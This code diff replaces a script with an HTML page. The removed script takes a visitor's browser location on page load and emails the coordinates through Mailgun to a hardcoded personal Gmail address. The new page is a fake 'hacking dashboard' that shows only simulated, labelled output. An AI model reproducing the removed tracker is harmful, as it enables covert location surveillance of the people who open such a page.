@@ -1,44 +1,209 @@
-// Get the current location of the device
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else {
-    console.log("Geolocation is not supported by this browser.");
-  }
-}
-
-// Display the location on a map
-function showPosition(position) {
-  var latitude = position.coords.latitude;
-  var longitude = position.coords.longitude;
-
-  // Send the location to your email
-  sendEmail(latitude, longitude);
-
-  // Create a map
-  var map = L.map('map').setView([latitude, longitude], 13);
-
-  // Add a tile layer
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-  }).addTo(map);
-
-  // Add a marker at the current location
-  L.marker([latitude, longitude]).addTo(map);
-}
-
-// Send the location to your email
-function sendEmail(latitude, longitude) {
-  var email = 'msiyol9045@gmail.com';
-  var subject = 'Location Update';
-  var body = 'Latitude: ' + latitude + '\nLongitude: ' + longitude;
-
-  var xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://api.mailgun.net/v3/YOUR-DOMAIN/messages', true);
-  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  xhr.setRequestHeader('Authorization', 'Basic ' + btoa('api:YOUR-API-KEY'));
-  xhr.send('from=' + encodeURIComponent(email) + '&to=' + encodeURIComponent(email) + '&subject=' + encodeURIComponent(subject) + '&text=' + encodeURIComponent(body));
-}
-
-// Get the location
-getLocation();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacking Dashboard</title>
+  <style>
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      background-color: #000;
+      color: #0f0;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    #app {
+      position: relative;
+      width: 100vw;
+      height: 100vh;
+    }
+    .modal {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: rgba(0, 0, 0, 0.7);
+      border: 2px solid #0f0;
+      padding: 2rem;
+      z-index: 1000;
+    }
+    .hidden {
+      display: none;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 20px;
+      background-color: #333;
+      border: 1px solid #0f0;
+      margin-bottom: 1rem;
+    }
+    .console {
+      background-color: #000;
+      color: #0f0;
+      padding: 1rem;
+      border: 1px solid #0f0;
+      overflow-y: auto;
+    }
+    .tool-card {
+      background-color: #111;
+      color: #0f0;
+      padding: 1rem;
+      border: 1px solid #0f0;
+      margin-bottom: 1rem;
+      cursor: pointer;
+    }
+    .panel-section {
+      margin-bottom: 1rem;
+    }
+    .feed, .alerts, #recent-extractions tbody {
+      background-color: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 1rem;
+    }
+    #hex-viewer {
+      background-color: #111;
+      color: #0f0;
+      padding: 1rem;
+      border: 1px solid #0f0;
+      white-space: pre-wrap;
+    }
+    .toast {
+      background-color: #ff0000;
+      color: #fff;
+      padding: 0.5rem;
+      border-radius: 4px;
+      position: absolute;
+      bottom: 1rem;
+      left: 50%;
+      transform: translateX(-50%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <div id="lockscreen" class="modal">
+      <h2>ENTER PASSCODE</h2>
+      <div class="keypad">
+        <!-- Keypad buttons here -->
+      </div>
+      <div id="wrongPassToast" class="toast">ACCESS DENIED — TRY AGAIN</div>
+    </div>
+    <div id="loadingScreen" class="hidden">
+      <div class="progress-bar"></div>
+      <div id="bootLines" class="console">
+        <div>LOADING ... MODULES: UI_RENDER</div>
+        <div>LOADING ... MODULES: AUDIO_DRIVER</div>
+        <div>LOADING ... MODULES: SIM_ENGINE</div>
+      </div>
+    </div>
+    <div id="dashboard" class="hidden">
+      <header>
+        <div class="header-text">Admin: Naresh</div>
+        <div class="status-badges">
+          <span>ENV: SIM</span>
+          <span>SESSION: 00:05:30</span>
+        </div>
+      </header>
+      <aside id="sidebar">
+        <div class="tool-card" data-tool="recon">Recon</div>
+        <div class="tool-card" data-tool="port-scan">Port Scan</div>
+        <div class="tool-card" data-tool="password-cracker">BruteForcer</div>
+        <div class="tool-card" data-tool="network-map">Network Map</div>
+        <div class="tool-card" data-tool="log-viewer">Log Viewer</div>
+        <div class="tool-card" data-tool="payload-simulator">Exploit Lab</div>
+        <div class="tool-card" data-tool="terminal">Terminal</div>
+      </aside>
+      <main id="main-panel">
+        <div id="active-tool-console" class="console">
+          <!-- Tool-specific console here -->
+        </div>
+      </main>
+      <aside id="right-panel">
+        <div class="panel-section">
+          <h3>Activity Feed</h3>
+          <div id="activity-feed" class="feed"></div>
+        </div>
+        <div class="panel-section">
+          <h3>Alerts</h3>
+          <div id="alerts" class="alerts"></div>
+        </div>
+        <div class="panel-section">
+          <h3>Recent Extractions</h3>
+          <table id="recent-extractions">
+            <thead><tr><th>ID</th><th>Data</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+        <div class="panel-section">
+          <h3>Hex Viewer</h3>
+          <pre id="hex-viewer"></pre>
+        </div>
+      </aside>
+    </div>
+  </div>
+  <script>
+    const PASSWORD = "659853";
+    function checkPassword(input) {
+      if (input === PASSWORD) {
+        playUnlockAnimation();
+        setTimeout(showDashboard, 2300);
+      } else {
+        showShakeModal();
+        showToast("ACCESS DENIED");
+      }
+    }
+    function simulateToolRun(toolName, userInput) {
+      writeConsoleLine(`[${toolName}] Target: ${sanitize(userInput)}`);
+      showProgress(0);
+      let p = 0;
+      const t = setInterval(() => {
+        p += Math.floor(Math.random() * 20) + 10;
+        updateProgress(p);
+        appendConsoleLine(`${toolName}: processing ${p}%`);
+        if (p >= 100) {
+          clearInterval(t);
+          appendConsoleLine(`${toolName}: COMPLETE — ACCESS GRANTED`);
+          showBadge("ACCESS GRANTED");
+          const fake = {
+            id: `FAKE-${Math.floor(Math.random() * 9000) + 1000}`,
+            ip: `192.0.2.${Math.floor(Math.random() * 200) + 1}`,
+            username: `sim_user_${Math.floor(Math.random() * 99)}`,
+            note: "THIS IS A SIMULATED RESPONSE"
+          };
+          displayFakeData(fake);
+        }
+      }, 300);
+    }
+    function sanitize(input) {
+      return input.replace(/[<>]/g, '');
+    }
+    function playUnlockAnimation() {}
+    function showDashboard() {
+      document.getElementById('lockscreen').classList.add('hidden');
+      document.getElementById('loadingScreen').classList.remove('hidden');
+      setTimeout(() => {
+        document.getElementById('loadingScreen').classList.add('hidden');
+        document.getElementById('dashboard').classList.remove('hidden');
+      }, 2300);
+    }
+    function showShakeModal() {}
+    function showToast(message) {
+      const toast = document.getElementById('wrongPassToast');
+      toast.textContent = message;
+      toast.style.opacity = '1';
+      setTimeout(() => {
+        toast.style.opacity = '0';
+      }, 2000);
+    }
+    function writeConsoleLine(line) {}
+    function showProgress(percent) {}
+    function appendConsoleLine(line) {}
+    function showBadge(message) {}
+    function displayFakeData(data) {}
+  </script>
+</body>
+</html>
